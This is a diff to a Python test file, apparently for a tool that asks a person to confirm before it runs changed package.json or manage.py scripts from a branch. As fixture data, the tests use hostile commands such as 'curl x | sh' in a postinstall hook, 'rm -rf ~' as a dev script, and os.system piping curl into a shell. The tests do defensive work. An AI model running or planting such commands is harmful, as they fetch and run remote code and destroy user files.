@@ -203,7 +203,9 @@ class ReviewFixes(Helpers, Base):
         self.p.popen = lambda args, **kw: ran.append(args) or subprocess.Popen(['sleep', '30'], **kw)
         got = self.p.start('demo', 'builder-1')
         self.assertEqual(got['state'], 'confirm')
-        self.assertEqual((got['command'], got['runs'], got['changed']), ('npm run dev', 'curl example.invalid | sh', ['dev']))
+        self.assertEqual((got['command'], got['changed']), ('npm run dev', ['dev']))
+        self.assertEqual(got['steps'], [{'line': 'npm run dev', 'scripts': [
+            {'name': 'dev', 'runs': 'curl example.invalid | sh', 'changed': True}]}])
         self.assertEqual(ran, [])  # nothing runs before the person says yes
         self.assertEqual(self.p.start('demo', 'builder-1', confirm='something else')['state'], 'confirm')
         self.assertEqual(self.p.start('demo', 'builder-1', confirm=got['fingerprint'])['state'], 'starting')
@@ -212,6 +214,26 @@ class ReviewFixes(Helpers, Base):
         self.p.stop('demo', 'builder-1')
         write(f"{self.wt('builder-1')}/package.json", json.dumps({'scripts': {'dev': 'rm -rf ~'}}))
         self.assertEqual(self.p.start('demo', 'builder-1')['state'], 'confirm')  # it changed: asked again
+
+    def test_every_changed_script_that_runs_is_shown_with_its_content(self):  # owner's fix to the sheet
+        base = {'scripts': {'dev': 'vite', 'predev': 'echo hi'}, 'devDependencies': {'vite': '6'}}
+        write(f'{self.repo}/package.json', json.dumps(base))
+        write(f'{self.repo}/manage.py', 'print(1)\n')
+        subprocess.run(['git', '-C', self.repo, 'add', '.'], check=True)
+        subprocess.run(['git', '-C', self.repo, 'commit', '-qm', 'pkg'], check=True)
+        mine = {'scripts': {'dev': 'vite', 'predev': 'echo hi', 'postinstall': 'curl x | sh', 'prepare': 'node a.js'},
+                'devDependencies': {'vite': '6'}}
+        self.branch('builder-1', {'package.json': json.dumps(mine)})
+        got = self.p.start('demo', 'builder-1')
+        self.assertEqual(got['changed'], ['postinstall', 'prepare'])
+        self.assertEqual(got['steps'], [
+            {'line': 'npm install', 'scripts': [{'name': 'postinstall', 'runs': 'curl x | sh', 'changed': True},
+                                                {'name': 'prepare', 'runs': 'node a.js', 'changed': True}]},
+            {'line': 'npm run dev', 'scripts': [{'name': 'dev', 'runs': 'vite', 'changed': False}]}])
+        self.branch('builder-2', {'manage.py': 'import os; os.system("curl x | sh")\n'})
+        got = self.p.start('demo', 'builder-2', command='python3 manage.py runserver $PORT')
+        self.assertEqual(got['steps'][-1]['scripts'], [
+            {'name': 'manage.py', 'runs': 'import os; os.system("curl x | sh")', 'changed': True}])
 
     def test_a_fresh_node_worktree_installs_first(self):  # 2
         self.branch('builder-1', {'package.json': json.dumps({'scripts': {'dev': 'vite'}, 'devDependencies': {'vite': '6'}})})
